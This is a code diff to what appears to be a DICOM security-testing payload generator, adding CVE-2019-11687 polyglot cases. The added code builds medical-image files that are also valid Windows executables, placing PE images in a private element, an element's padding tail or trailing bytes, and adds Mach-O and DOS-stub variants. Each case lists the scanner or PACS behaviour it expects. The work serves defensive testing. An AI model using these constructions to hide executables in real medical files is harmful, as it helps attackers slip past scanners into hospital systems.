@@ -35,7 +35,10 @@ CVE coverage is tagged at two fidelity levels in each payload's metadata:
                             carry metadata['bug_class'].
 
 Targeted (metadata['cve']):
-    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM/TIFF polyglots)
+    CVE-2019-11687  - Executable embedding (PEDICOM/ELFDICOM/Mach-O/TIFF
+                      polyglots) across all five Part-10 safe zones; see
+                      c_scare.polyglot for the PE synthesis, zone enumeration
+                      and dual-pipeline validation behind these payloads
     CVE-2022-2119   - SCP path traversal in stored DICOM filenames
     CVE-2022-2120   - SCU path traversal (same payload, RawSCP delivery)
     CVE-2023-32135  - Use-After-Free trigger in DCM parsing (structural seed)
@@ -118,6 +121,7 @@ from .element import Element, Dataset, Tag, VR
 from .corruptor import Corruptor, Override, Injection, InjectionPoint
 from .pixel import EncapsulatedPixelData, Fragment
 from .file import DicomFile
+from .polyglot import dos_header, pe_image
 
 # Scapy imports - may not be available in all environments
 try:
@@ -4130,9 +4134,14 @@ class CVEAttacks:
     # CVE-2019-11687: Executable Embedding (PEDICOM/ELFDICOM)
     # -------------------------------------------------------------------------
     
+    # A conforming private block: the creator element claims (0009,10xx) for
+    # 'C-SCARE POLYGLOT', so the carrier element that follows is a legitimate
+    # vendor extension rather than an orphan tag a validator would flag.
+    _POLYGLOT_PRIVATE_CREATOR = Element(0x0009, 0x0010, 'LO', 'C-SCARE POLYGLOT')
+
     @staticmethod
-    def _polyglot_part10(preamble: bytes) -> bytes:
-        """Wrap an executable ``preamble`` in a conformant Part-10 file.
+    def _polyglot_file(preamble: bytes) -> DicomFile:
+        """A conformant Part-10 file carrying ``preamble`` in its first 128 bytes.
 
         The whole point of CVE-2019-11687 is a file that is *simultaneously*
         valid in two formats: a loader sees the preamble, a PACS sees DICOM.
@@ -4153,14 +4162,70 @@ class CVEAttacks:
             sop_instance_uid='1.2.3.4.5',
             transfer_syntax='1.2.840.10008.1.2.1',  # Explicit VR LE
         )
-        df.dataset = CVEAttacks._ds_bytes([
+        return df
+
+    @staticmethod
+    def _polyglot_body() -> bytes:
+        """The clinical half: enough of a Secondary Capture to look routine."""
+        return CVEAttacks._ds_bytes([
             Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID),
             Element(0x0008, 0x0018, 'UI', '1.2.3.4.5'),
             Element(0x0008, 0x0060, 'CS', 'OT'),
             Element(0x0010, 0x0010, 'PN', 'Doe^John'),
             Element(0x0010, 0x0020, 'LO', '12345'),
         ])
-        return df.encode()
+
+    @staticmethod
+    def _polyglot_part10(preamble: bytes, lead: bytes = b'',
+                         trailing: bytes = b'') -> bytes:
+        """Assemble a polyglot: ``lead`` opens the Data Set, ``trailing``
+        follows the whole file."""
+        df = CVEAttacks._polyglot_file(preamble)
+        df.dataset = lead + CVEAttacks._polyglot_body()
+        return df.encode() + trailing
+
+    @staticmethod
+    def _polyglot_head_len(lead: bytes = b'') -> int:
+        """Offset of the first byte after ``lead`` in the assembled file.
+
+        The preamble and File Meta group are fixed-size for a given transfer
+        syntax, so encoding once with an empty Data Set gives the offset at
+        which the Data Set starts — which is what ``e_lfanew`` has to be
+        computed against *before* the carrier element is built.
+        """
+        df = CVEAttacks._polyglot_file(b'\x00' * 128)
+        df.dataset = b''
+        return len(df.encode()) + len(lead)
+
+    @staticmethod
+    def _pedicom(bits: int) -> bytes:
+        """Property 1 and Property 2 composed — the full PEDICOM construction.
+
+        An MZ DOS header occupies the ignored preamble; its ``e_lfanew`` points
+        past ``DICM`` and the File Meta group at a PE image parked in the value
+        of an opaque private ``OB`` element. Both halves are structurally
+        complete: a PE loader can walk every header, and a DICOM reader
+        traverses the private element without inspecting a byte of it.
+
+        The value is zero-padded so the PE signature lands 4-byte aligned. The
+        x86 and x86-64 loaders tolerate a misaligned signature; the ARM64
+        emulation layer rejects it, and the padding costs nothing in DICOM
+        terms because it sits inside a value nothing parses.
+        """
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        # +12 for the carrier's Explicit VR long-form header (tag, 'OB',
+        # 2 reserved bytes, 4-byte length).
+        value_start = CVEAttacks._polyglot_head_len(creator) + 12
+        pad = -value_start % 4
+        pe_offset = value_start + pad
+
+        carrier = Element(0x0009, 0x1001, 'OB',
+                          b'\x00' * pad + pe_image(pe_offset, bits=bits))
+        return CVEAttacks._polyglot_part10(
+            preamble=dos_header(pe_offset) + b'\x00' * 64,
+            lead=creator + carrier.encode(implicit_vr=False, little_endian=True),
+        )
 
     @staticmethod
     def cve_2019_11687_polyglot() -> List[AttackResult]:
@@ -4169,27 +4234,32 @@ class CVEAttacks:
 
         The 128-byte preamble can contain PE/ELF headers, making the file
         valid as both DICOM and executable.
+
+        Payloads split along two axes. *Which second format* the file also
+        claims to be — PE, ELF, Mach-O, shell, batch, TIFF — decides whether a
+        scanner's magic-byte table fires at all. *Which safe zone* carries the
+        foreign bytes decides whether the scanner ever reads them: the preamble
+        is in front of every reader, while a private element, an element's
+        padding tail, and the space past the final element are all regions a
+        conforming parser walks over without inspecting. ``metadata['zone']``
+        names the region under test.
         """
         results = []
-        
-        # Test 1: Minimal PE header in preamble
-        # DOS Header
-        dos_header = b'MZ' + b'\x00' * 58  # MZ signature + padding
-        dos_header += struct.pack('<I', 0x80)  # e_lfanew points to offset 128 (after preamble)
-        dos_header += b'\x00' * (64 - len(dos_header))  # Pad DOS header to 64 bytes
-        dos_header += b'\x00' * 64  # Rest of preamble
-        
-        file_data = CVEAttacks._polyglot_part10(dos_header)
-        
+
+        # Test 1: the full PEDICOM cross-reference — MZ in the ignored
+        # preamble, PE image in an opaque private element (PE32+, x86-64).
         results.append(AttackResult(
             name='cve_2019_11687_01_pe_header',
             category='cve',
-            payload=file_data,
-            description='DOS/PE header in DICOM preamble (PEDICOM)',
-            expected_behavior='Scanner should detect PE signature',
-            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE'}
+            payload=CVEAttacks._pedicom(bits=64),
+            description='DOS header in the preamble whose e_lfanew points at a '
+                        'PE32+ image in a private OB element (PEDICOM)',
+            expected_behavior='Scanner should detect the PE image behind the '
+                              'preamble; PACS should not store an executable',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'private_element', 'pe_bits': 64}
         ))
-        
+
         # Test 2: ELF header in preamble
         elf_header = b'\x7FELF'  # ELF magic
         elf_header += b'\x02'  # 64-bit
@@ -4205,7 +4275,8 @@ class CVEAttacks:
             payload=file_data,
             description='ELF header in DICOM preamble (ELFDICOM)',
             expected_behavior='Scanner should detect ELF signature',
-            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF'}
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'ELF',
+                      'zone': 'preamble_dos_header'}
         ))
         
         # Test 3: Shell script in preamble
@@ -4220,7 +4291,8 @@ class CVEAttacks:
             payload=file_data,
             description='Shell script in DICOM preamble',
             expected_behavior='Scanner should detect script',
-            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'shell'}
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'shell',
+                      'zone': 'preamble_dos_header'}
         ))
         
         # Test 4: Batch script in preamble
@@ -4235,7 +4307,8 @@ class CVEAttacks:
             payload=file_data,
             description='Batch script in DICOM preamble',
             expected_behavior='Scanner should detect batch script',
-            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch'}
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'batch',
+                      'zone': 'preamble_dos_header'}
         ))
 
         # Test 5: TIFF header in preamble (dual-purpose TIFF/DICOM)
@@ -4255,7 +4328,110 @@ class CVEAttacks:
             payload=file_data,
             description='TIFF header in DICOM preamble (dual-purpose TIFF/DICOM)',
             expected_behavior='Scanner should detect TIFF signature',
-            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'TIFF'}
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'TIFF',
+                      'zone': 'preamble_dos_header'}
+        ))
+
+        # Test 6: Mach-O header in preamble. The published construction targets
+        # the Windows loader, but the preamble is loader-agnostic — a scanner
+        # whose magic table stops at MZ and \x7fELF misses this one entirely.
+        macho = struct.pack('<IIIIIIII',
+                            0xFEEDFACF,   # MH_MAGIC_64
+                            0x0100000C,   # CPU_TYPE_ARM64
+                            0x00000000,   # CPU_SUBTYPE_ARM64_ALL
+                            0x00000002,   # MH_EXECUTE
+                            0, 0, 0, 0)   # no load commands
+        macho += b'\x00' * (128 - len(macho))
+
+        results.append(AttackResult(
+            name='cve_2019_11687_06_macho_header',
+            category='cve',
+            payload=CVEAttacks._polyglot_part10(macho),
+            description='Mach-O 64-bit header in DICOM preamble',
+            expected_behavior='Scanner should detect Mach-O signature',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'MachO',
+                      'zone': 'preamble_dos_header'}
+        ))
+
+        # Test 7: the PE32 (x86) variant of test 1. The two Optional Header
+        # layouts differ in width and field order, so a scanner that parses
+        # PE32+ correctly can still walk off the end of a PE32 image.
+        results.append(AttackResult(
+            name='cve_2019_11687_07_pe32_private_element',
+            category='cve',
+            payload=CVEAttacks._pedicom(bits=32),
+            description='PEDICOM with a PE32 (x86) image in a private OB element',
+            expected_behavior='Scanner should detect the PE image behind the '
+                              'preamble regardless of Optional Header layout',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'private_element', 'pe_bits': 32}
+        ))
+
+        # Test 8: the DOS stub half of the preamble (bytes 0x40-0x7F). It is
+        # never executed in protected mode and no DICOM reader looks at it, so
+        # it is 64 bytes of storage that survives a round trip through a PACS
+        # while belonging to neither format's parsed structure.
+        stub_marker = b'C-SCARE-STUB-ZONE:' + bytes(range(0x20, 0x40))
+        results.append(AttackResult(
+            name='cve_2019_11687_08_dos_stub_zone',
+            category='cve',
+            payload=CVEAttacks._polyglot_part10(
+                dos_header(e_lfanew=0) + stub_marker.ljust(64, b'\x00')),
+            description='Marker payload in the preamble DOS stub (bytes '
+                        '0x40-0x7F), a region neither format parses',
+            expected_behavior='PACS should zero or reject a non-empty preamble '
+                              'rather than round-trip 64 attacker bytes',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'preamble_dos_stub',
+                      'marker': stub_marker.decode('latin-1')}
+        ))
+
+        # Test 9: the padding tail of a Data Element. Same reachability as the
+        # private-element carrier, but stealthier against inventory-style
+        # defences: no new tag appears, only an existing element whose declared
+        # length runs past where its value stops.
+        content = b'VENDORCFG\x00'
+        creator = CVEAttacks._POLYGLOT_PRIVATE_CREATOR.encode(
+            implicit_vr=False, little_endian=True)
+        value_start = CVEAttacks._polyglot_head_len(creator) + 12
+        pad_start = value_start + len(content)
+        pe_offset = pad_start + (-pad_start % 4)
+        carrier = Element(
+            0x0009, 0x1002, 'UN',
+            content + b'\x00' * (pe_offset - pad_start) + pe_image(pe_offset))
+
+        results.append(AttackResult(
+            name='cve_2019_11687_09_element_padding_gap',
+            category='cve',
+            payload=CVEAttacks._polyglot_part10(
+                preamble=dos_header(pe_offset) + b'\x00' * 64,
+                lead=creator + carrier.encode(implicit_vr=False,
+                                              little_endian=True)),
+            description='PE image hidden in the padding tail of a Data Element '
+                        'whose declared length covers it',
+            expected_behavior='Scanner should inspect whole element values, not '
+                              'just the content up to the first padding byte',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'element_padding', 'pe_bits': 64}
+        ))
+
+        # Test 10: everything past the final Data Element. A reader stops at
+        # the end of the Data Set, so this region is invisible to DICOM
+        # tooling — yet it is inside the file the PE loader maps.
+        head_len = CVEAttacks._polyglot_head_len()
+        trailing_offset = head_len + len(CVEAttacks._polyglot_body())
+        results.append(AttackResult(
+            name='cve_2019_11687_10_trailing_append',
+            category='cve',
+            payload=CVEAttacks._polyglot_part10(
+                preamble=dos_header(trailing_offset) + b'\x00' * 64,
+                trailing=pe_image(trailing_offset)),
+            description='PE image appended after the final Data Element, '
+                        'outside the Data Set entirely',
+            expected_behavior='PACS should truncate or reject bytes past the '
+                              'end of the Data Set',
+            metadata={'cve': 'CVE-2019-11687', 'polyglot': 'PE',
+                      'zone': 'trailing', 'pe_bits': 64}
         ))
 
         return results
